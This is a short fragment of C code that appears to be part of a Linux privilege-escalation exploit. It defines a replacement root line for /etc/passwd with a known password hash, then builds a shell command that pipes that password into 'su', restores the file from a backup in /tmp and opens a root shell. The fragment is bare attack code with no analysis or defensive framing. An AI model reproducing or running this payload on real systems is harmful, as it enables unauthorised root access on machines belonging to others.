const char *const path = "/etc/passwd";

// data should be replaced by the user password
const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -6 -salt root piped ;

char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
            "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
            "cp /tmp/passwd.bak /etc/passwd;"
            "echo \\\"Done! Popping shell... (run commands now)\\\";"
            "/bin/sh;"
        "\" root"};
